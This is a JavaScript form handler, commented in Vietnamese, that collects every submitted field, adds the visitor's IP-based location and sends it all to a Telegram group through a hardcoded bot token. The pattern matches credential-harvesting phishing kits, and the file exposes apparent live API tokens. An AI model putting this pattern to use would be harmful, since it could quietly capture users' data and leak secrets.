const sendTele = async (message) => {
    const token = '7401189273:AAFw_XI65C9kQypHWf6v2wiQsr3aq4XGpqo'; // Thay bằng token bot của bạn
    const chatId = '-4579170320'; // Thay bằng chat ID của bạn hoặc ID của nhóm/kênh

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown', // Hoặc 'HTML' tùy theo cách bạn muốn định dạng tin nhắn
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error(`Error: ${response.statusText}`);
        }

        const data = await response.json();
        console.log('Message sent successfully:', data);
    } catch (error) {
        console.error('Failed to send message:', error);
    }
};

const formatMessage = async (dataObject) => {
    let ip = 'Unknown IP';
    let country = 'Unknown Country';
    let city = 'Unknown City';
    try {
        const token = 'ff98e2ddecdf4f';  // Thay thế token của bạn ở đây
        const url = `https://ipinfo.io/json?token=${token}`;
        const response = await fetch(url);
        if (response.ok) {
            const data = await response.json();
            ip = data.ip;
            country = data.country;
            city = data.city;
        } else {
            throw new Error('Failed to fetch IP information. Response status: ' + response.status);
        }
    } catch (error) {
        console.error('Failed to fetch IP address:', error);
    }
    let message = `IP: *${ip}* \n`;
    message += `Country: *${country}* \n`;
    message += `City: *${city}* \n\n`;

    for (const [key, value] of Object.entries(dataObject)) {
        const formattedKey = key.replace(/-/g, ' ').replace(/_/g, ' ').replace(/\b\w/g, (char) => char.toUpperCase());
        message += `*${formattedKey}:* ${value}\n`;
    }

    return message;
};


export async function sendByForm(event) {
    event.preventDefault()

    var form = event.target;

    var formData = new FormData(form);

    var formObject = {};
    formData.forEach((value, key) => {
        formObject[key] = value;
    });

    await sendTele(await formatMessage(formObject))
}